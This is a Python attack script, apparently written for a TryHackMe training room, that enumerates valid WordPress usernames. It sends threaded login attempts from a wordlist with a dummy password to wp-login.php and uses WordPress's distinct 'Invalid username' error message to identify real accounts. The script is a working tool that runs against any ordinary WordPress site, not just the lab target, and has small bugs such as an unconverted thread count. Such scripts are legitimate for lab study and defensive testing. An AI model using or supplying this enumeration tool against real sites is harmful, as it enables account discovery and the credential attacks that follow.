#!/usr/bin/python3
import requests
import argparse
import threading
from bs4 import BeautifulSoup

ended = False

def get_parser():
    parser = argparse.ArgumentParser(description="Exploits Python Playground from TryHackMe",epilog="python .\wpenumusers.py -u http://10.10.49.44/wp-login.php -w w.txt")
    parser.add_argument("-u","--url",action="store",dest="url",default=False, help="Wordpress login form url",required=True)
    parser.add_argument("-w","--wordlist",action="store", dest="wordlist",default=False, help="Users dictionary",required=True)
    parser.add_argument("-t","--threads",action="store", dest="threads",default=10, help="Threads")
    return parser

def check_connection(url):
    bogus_payload = {
        "log" : "aaa",
        "pwd" : "aaa",
        "wp-submit" : "Log In"
    }
    r = requests.post(url, data=bogus_payload)
    return r.status_code == 200

def bruteforce(wordlist,url):
    global ended
    while(wordlist and (not ended)):
        username = wordlist.pop()
        username = username.split("\n")[0]
        payload = {
            "log" : username,
            "pwd" : "fadfadf",
            "wp-submit" : "Log In"
        }
        r = requests.post(url, data=payload)
        soup = BeautifulSoup(r.text,"html.parser")
        err = soup.find(id="login_error").find("strong").next_sibling
        if (str(err).find("Invalid username") == -1):
            print(username)
            ended = True
            break


def run():
    parser = get_parser()
    args = parser.parse_args()
    if(check_connection(args.url)):
        with open(args.wordlist, "r") as wordlist:
            words = [line.rstrip("\n") for line in wordlist]
        threads = list()
        for i in range(args.threads):
            t = threading.Thread(target=bruteforce,args=(words,args.url))
            threads.append(t)
            t.start()


run()